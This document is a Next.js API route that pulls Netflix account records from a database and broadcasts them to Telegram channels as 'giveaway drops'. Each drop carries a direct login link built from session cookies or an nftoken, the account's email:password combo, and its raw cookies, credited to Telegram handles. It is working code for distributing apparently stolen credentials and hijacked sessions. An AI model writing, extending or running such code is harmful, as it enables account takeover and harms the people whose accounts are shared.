import { NextResponse } from "next/server";
import { getDatabase } from "@/lib/mongodb";
import { sendTelegramDocument, sendTelegramMessage } from "@/lib/telegram";
import { getFullCountryName } from "@/lib/countries";
import { generateDirectLoginLink } from "@/lib/directLink";

export const dynamic = "force-dynamic";

function standardizePlan(rawPlan, standardPlan) {
  if (standardPlan && standardPlan !== "N/A" && standardPlan !== "Unknown" && standardPlan !== "") {
    const sp = String(standardPlan).trim();
    if (["Premium", "Standard", "Basic", "Mobile"].includes(sp)) {
      return sp;
    }
  }
  if (!rawPlan) return "Premium";
  const p = String(rawPlan).toLowerCase();
  if (p.includes("error") || p.includes("500") || p.includes("server error")) {
    return "Premium";
  }
  if (p.includes("premium") || p.includes("prémium") || p.includes("pre") || p.includes("4k") || p.includes("ultra")) {
    return "Premium";
  }
  if (p.includes("standard") || p.includes("estándar") || p.includes("padrão") || p.includes("standart") || p.includes("hd") || p.includes("1080")) {
    return "Standard";
  }
  if (p.includes("basic") || p.includes("básico") || p.includes("basique") || p.includes("basico") || p.includes("720")) {
    return "Basic";
  }
  if (p.includes("mobile") || p.includes("móvil") || p.includes("mobil")) {
    return "Mobile";
  }
  return "Premium";
}

export async function POST(request) {
  try {
    const body = await request.json();
    const { country, plan, channel, customMessage } = body;

    const db = await getDatabase();
    const stockCol = db.collection("stock");
    const settingsCol = db.collection("settings");
    const logsCol = db.collection("activity_logs");

    // Fetch Settings
    const settings = (await settingsCol.findOne({ _id: "config" })) || {
      channels: [],
    };

    let targetChannels = channel ? [channel] : settings.channels || [];
    if (!targetChannels || targetChannels.length === 0) {
      const envChannels = (process.env.CHANNEL_IDS || "")
        .split(",")
        .map((c) => c.trim())
        .filter(Boolean);
      targetChannels = envChannels;
    }

    if (!targetChannels || targetChannels.length === 0) {
      return NextResponse.json(
        { success: false, error: "No channels configured to receive giveaway drops." },
        { status: 400 }
      );
    }

    // Build Match Criteria
    const match = { status: "active" };
    if (country && country !== "all") {
      match.country = { $regex: country.split(" ")[0], $options: "i" };
    }
    if (plan && plan !== "all") {
      match.$or = [{ standard_plan: plan }, { plan: { $regex: plan, $options: "i" } }];
    }

    // Sample up to 6 candidates to pick one with a valid token
    const candidates = await stockCol.aggregate([{ $match: match }, { $sample: { size: 6 } }]).toArray();

    if (!candidates || candidates.length === 0) {
      return NextResponse.json(
        { success: false, error: "No matching active stock found for this criteria." },
        { status: 404 }
      );
    }

    let item = null;
    let directLink = null;

    for (const cand of candidates) {
      try {
        const link = await generateDirectLoginLink(cand.cookies);
        if (link) {
          item = cand;
          directLink = link;
          break;
        }
      } catch (err) {
        console.warn(`Failed token check for ${cand.email}:`, err.message);
      }
    }

    // If no candidate generated a dynamic token, use the first candidate and a fallback link
    if (!item) {
      item = candidates[0];
      if (item.nftoken) {
        directLink = `https://netflix.com/?nftoken=${encodeURIComponent(item.nftoken)}`;
      } else if (item.direct_link) {
        directLink = item.direct_link;
      } else {
        directLink = "https://www.netflix.com/login";
      }
    }

    const fullCountry = getFullCountryName(item.country);
    const cleanPlan = standardizePlan(item.plan, item.standard_plan);

    // Caption matching bot.py exactly:
    let caption = customMessage;
    if (!caption) {
      caption = `🎁 *New Drop!*\n\n` +
        `🌍 *Country:* ${fullCountry}\n` +
        `📺 *Plan:* ${cleanPlan}\n\n` +
        `🔗 *Direct Login Link:* [Click Here to Login](${directLink})\n\n` +
        `🌟 *Provided By:* @iq4u8 & @xxbga\n` +
        `📢 *Join us:* [Giveaway Hub](https://t.me/givaway_hub)`;
    } else {
      caption = caption
        .replace("{country}", fullCountry)
        .replace("{plan}", cleanPlan)
        .replace("{email}", item.email || "Active")
        .replace("{direct_link}", directLink);
    }

    // File content for {email}_account.txt matching bot.py lines 1477-1481 exactly:
    let fileContent = `━━━━━━━━━━━━━━━━━━━━━━\n` +
      `🌟 Provided By: @iq4u8 & @xxbga 🌟\n` +
      `📢 Join us: https://t.me/givaway_hub\n` +
      `━━━━━━━━━━━━━━━━━━━━━━\n\n` +
      `Direct Link: ${directLink}\n\n`;

    if (item.password) {
      fileContent += `Combo: ${item.email}:${item.password}\n\n`;
    }
    fileContent += `Cookies:\n${item.cookies || ""}\n`;

    const fileName = `${item.email}_account.txt`;

    // Send Document to Telegram Channels
    const sentResults = [];
    for (const ch of targetChannels) {
      try {
        const res = await sendTelegramDocument(ch, fileContent, fileName, caption, "Markdown");
        sentResults.push({ channel: ch, success: true, messageId: res.message_id });
      } catch (docErr) {
        console.warn(`sendTelegramDocument failed for ${ch}, trying fallback:`, docErr.message);
        try {
          // Fallback to text message if document upload fails
          const res = await sendTelegramMessage(ch, caption, "Markdown");
          sentResults.push({ channel: ch, success: true, messageId: res.message_id });
        } catch (msgErr) {
          console.error(`Failed to send giveaway to channel ${ch}:`, msgErr.message);
          sentResults.push({ channel: ch, success: false, error: msgErr.message });
        }
      }
    }

    const anySuccess = sentResults.some((r) => r.success);
    if (!anySuccess) {
      return NextResponse.json(
        { success: false, error: "Failed to broadcast drop to any configured channel.", channels: sentResults },
        { status: 500 }
      );
    }

    // Remove or mark as given from active stock (matching bot.py behavior)
    await stockCol.updateOne(
      { _id: item._id },
      { $set: { status: "given", droppedAt: new Date() } }
    );

    // Update settings drop counter
    await settingsCol.updateOne(
      { _id: "config" },
      {
        $inc: { drops_today: 1 },
        $set: { last_drop_time: new Date() },
      },
      { upsert: true }
    );

    // Log activity
    await logsCol.insertOne({
      action: "GIVEAWAY_TRIGGERED",
      details: `Dropped ${cleanPlan} (${fullCountry}) to ${sentResults.filter((r) => r.success).length} channel(s)`,
      status: "success",
      timestamp: new Date(),
    });

    return NextResponse.json({
      success: true,
      message: "Giveaway dropped successfully matching bot format!",
      droppedItem: {
        email: item.email,
        country: fullCountry,
        plan: cleanPlan,
        directLink,
      },
      channels: sentResults,
    });
  } catch (err) {
    console.error("Giveaway API Error:", err);
    return NextResponse.json({ success: false, error: err.message }, { status: 500 });
  }
}
